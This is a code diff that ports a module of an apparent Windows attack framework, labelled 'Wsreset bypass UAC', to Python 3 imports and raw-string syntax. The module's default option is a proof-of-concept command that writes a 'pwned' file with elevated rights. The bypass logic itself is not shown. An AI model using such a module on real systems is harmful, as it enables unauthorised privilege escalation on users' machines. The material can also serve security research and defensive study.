@@ -7,9 +7,13 @@
 # Fileless - Wsreset bypass UAC 
 
 
-from module import Module
-from support.winreg import Registry
-from _winreg import HKEY_CURRENT_USER as HKCU
+try:
+    from ...module import Module
+    from ...support.winreg import Registry
+except ImportError:
+    from module import Module
+    from support.winreg import Registry
+from winreg import HKEY_CURRENT_USER as HKCU
 
 class CustomModule(Module):
     def __init__(self):
@@ -18,7 +22,7 @@ class CustomModule(Module):
                        "Author": "Josue Encinar"}
 
         # -----------name-----default_value--description
-        options = {"instruction": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
+        options = {"instruction": [r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
                    }
 
         # Constructor of the parent class
